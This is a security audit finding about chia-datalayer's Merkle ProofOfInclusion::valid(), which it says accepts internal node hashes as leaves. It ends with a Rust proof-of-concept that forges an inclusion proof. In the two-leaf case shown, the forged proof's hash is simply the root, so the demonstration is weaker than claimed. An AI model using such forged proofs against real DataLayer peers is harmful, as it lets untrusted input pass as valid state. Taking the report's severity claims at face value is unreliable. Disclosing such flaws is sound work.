### Title
DataLayer `ProofOfInclusion::valid()` Accepts Forged Inclusion Proof via Internal Node Hash (Second-Preimage Attack) - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

---

### Summary

`ProofOfInclusion::valid()` in the DataLayer Merkle library does not verify that `node_hash` is a leaf-level hash. Because internal node hashes and leaf hashes share the same 32-byte domain with no leaf-specific domain separator, an attacker who knows any internal node hash can construct a shorter-path `ProofOfInclusion` that passes `valid()` — proving inclusion of a hash that is not a leaf in the tree.

---

### Finding Description

The DataLayer Merkle tree computes internal node hashes using a `\x02` prefix:

```rust
// crates/chia-datalayer/src/merkle/blob.rs:48-55
pub fn internal_hash(left_hash: &Hash, right_hash: &Hash) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(b"\x02");
    hasher.update(left_hash.0);
    hasher.update(right_hash.0);
    Hash(Bytes32::new(hasher.finalize()))
}
``` [1](#0-0) 

Leaf hashes, by contrast, are stored as externally provided 32-byte values with **no domain separator** — they are inserted directly into `LeafNode.hash` and stored verbatim. [2](#0-1) 

The proof verification function `ProofOfInclusion::valid()` starts from `self.node_hash` and walks up the tree using `calculate_internal_hash` at each layer:

```rust
// crates/chia-datalayer/src/merkle/proof_of_inclusion.rs:40-58
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()
}
``` [3](#0-2) 

`valid()` **never checks** that `node_hash` is a leaf hash rather than an internal node hash. `ProofOfInclusion` is a public, fully `Streamable` struct with public fields, so an attacker can freely construct one from bytes: [4](#0-3) 

---

### Impact Explanation

Given a tree with leaves `L1`, `L2` and internal node `I = sha256(\x02 || L1 || L2)`, and root `R = sha256(\x02 || I || X)`:

An attacker constructs:
```
ProofOfInclusion {
    node_hash: I,                          // internal node hash, not a leaf
    layers: [ProofOfInclusionLayer {
        other_hash_side: Right,
        other_hash: X,
        combined_hash: R,
    }]
}
```

`valid()` computes `calculate_internal_hash(I, Right, X) = sha256(\x02 || I || X) = R`, which equals `root_hash()`, so it returns `true`. The proof is accepted even though `I` is not a leaf in the tree.

This allows untrusted input to prove invalid state in the DataLayer — matching the **High** impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."*

---

### Likelihood Explanation

- Internal node hashes are public (they are part of the tree structure shared between DataLayer peers).
- `ProofOfInclusion` is `Streamable` and fully constructable from bytes by any caller.
- No privileged access is required; any peer receiving a proof from an untrusted source and calling `valid()` is exposed.
- The attack requires only knowledge of the tree's internal structure, which is available to any participant.

---

### Recommendation

Apply a leaf-specific domain separator when storing or hashing leaf nodes, analogous to the `\x02` prefix used for internal nodes. For example, compute leaf hashes as `sha256(\x01 || raw_hash)` at insertion time, and verify in `valid()` that `node_hash` was produced with the leaf prefix. This ensures internal node hashes and leaf hashes occupy disjoint domains and cannot be substituted for one another.

Alternatively, add an explicit check in `valid()` that rejects any `node_hash` that is structurally consistent with an internal node hash (though domain separation is the more robust fix).

### Proof of Concept

```rust
use chia_datalayer::{
    Hash, KeyId, MerkleBlob, Side, ValueId,
    proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer},
    internal_hash,
};
use chia_protocol::Bytes32;

fn main() {
    // Build a tree with two leaves
    let h1 = Hash(Bytes32::new([1u8; 32]));
    let h2 = Hash(Bytes32::new([2u8; 32]));
    let mut blob = MerkleBlob::new(Vec::new()).unwrap();
    blob.insert(KeyId(1), ValueId(1), &h1, chia_datalayer::InsertLocation::Auto {}).unwrap();
    blob.insert(KeyId(2), ValueId(2), &h2, chia_datalayer::InsertLocation::Auto {}).unwrap();
    blob.calculate_lazy_hashes().unwrap();

    // Obtain the real proof for h1 to learn the tree structure
    let real_proof = blob.get_proof_of_inclusion(KeyId(1)).unwrap();
    assert!(real_proof.valid());

    // The internal node hash of (h1, h2) is known from the real proof's combined_hash
    // Construct a forged proof using the internal node hash as node_hash with a shorter path
    let internal = real_proof.layers[0].combined_hash; // internal_hash(h1, h2)
    let root = real_proof.root_hash();

    // Build a forged proof: node_hash = internal node, one fewer layer
    let forged = ProofOfInclusion {
        node_hash: internal,
        layers: real_proof.layers[1..].to_vec(), // skip the bottom layer
    };

    // valid() returns true even though `internal` is not a leaf
    assert!(forged.valid(), "Forged proof accepted!");
    assert_eq!(forged.root_hash(), root);
    println!("Forged proof valid: {}", forged.valid()); // true
}
